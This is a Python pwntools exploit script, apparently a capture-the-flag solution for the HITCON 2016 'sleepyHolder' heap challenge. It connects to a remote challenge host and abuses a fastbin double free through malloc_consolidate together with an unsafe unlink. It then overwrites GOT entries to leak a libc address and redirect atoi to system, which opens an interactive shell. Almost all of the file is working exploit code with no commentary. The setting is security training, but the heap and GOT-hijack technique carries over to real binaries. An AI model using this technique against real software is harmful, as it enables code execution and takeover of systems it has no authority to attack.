from pwn import *

#p = process('./sleepyHolder_hitcon_2016')
p = remote('node4.buuoj.cn', 28441)
elf = ELF('sleepyHolder_hitcon_2016')
libc = ELF('libc-2.23.buu.so')

#context.log_level = 'debug'
context.arch = 'amd64'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def allocSmall(content):
    sla(b'3. Renew secret', b'1')
    sla(b'2. Big secret', b'1')
    sa(b'Tell me your secret: ', content)

def allocBig(content):
    sla(b'3. Renew secret', b'1')
    sla(b'2. Big secret', b'2')
    sa(b'Tell me your secret: ', content)

def allocLarge(content):
    sla(b'3. Renew secret', b'1')
    sla(b'2. Big secret', b'3')
    sa(b'Tell me your secret: ', content)

def deleteSmall():
    sla(b'3. Renew secret', b'2')
    sla(b'2. Big secret', b'1')

def deleteBig():
    sla(b'3. Renew secret', b'2')
    sla(b'2. Big secret', b'2')

def editSmall(content):
    sla(b'3. Renew secret', b'3')
    sla(b'2. Big secret', b'1')    
    sa(b'Tell me your secret: ', content)

def editBig(content):
    sla(b'3. Renew secret', b'3')
    sla(b'2. Big secret', b'2')    
    sa(b'Tell me your secret: ', content)


allocSmall(b'a')
allocBig(b'a')
deleteSmall()

allocLarge(b'a')

deleteSmall()

small_secret = 0x6020D0

layout = [
    0, 0x21,
    small_secret - 0x18, small_secret - 0x10,
    0x20
]

allocSmall(flat(layout))

deleteBig()

puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']
free_got = elf.got['free']

payload = p64(0) + p64(small_secret) + p64(0) + p64(free_got)
payload += p64(0x100000001)
editSmall(payload)
editSmall(p64(puts_plt))
editBig(p64(atoi_got))

deleteSmall()

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['atoi']
success('libc_base -> {}'.format(hex(libc_base)))
system = libc_base + libc.sym['system']

editBig(p64(atoi_got) + p64(0x100000001) + p32(1))
editSmall(p64(system))

sla(b'3. Renew secret', b'sh\x00')

p.interactive()